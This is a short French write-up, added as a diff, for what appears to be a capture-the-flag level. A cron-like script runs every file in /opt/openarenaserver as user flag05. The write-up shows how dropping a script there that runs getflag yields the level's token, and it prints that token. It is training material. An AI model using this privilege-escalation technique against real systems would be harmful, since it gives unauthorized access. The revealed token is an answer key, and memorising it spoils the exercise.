@@ -1,0 +1,25 @@
+Command:
+	chmod 777 ./
+Command:
+	cat /usr/sbin/openarenaserver
+
+Result:
+	#!/bin/sh
+
+	for i in /opt/openarenaserver/* ; do
+        	(ulimit -t 5; bash -x "$i")
+	        rm -f "$i"
+	done
+
+Ce script est executer tout les X secondes par l’user flag05. Ce script exécute tous les scripts presents dans /opt/openarenaserver
+
+Dans /opt/openarenaserver, créer un fichier:
+
+#!/bin/bash
+
+getflag > /home/user/level05/tt
+
+Cat le fichier tt jusqu’a ce que le mot de passe s’affiche.
+
+Result:
+	Check flag.Here is your token : viuaaale9huek52boumoomioc
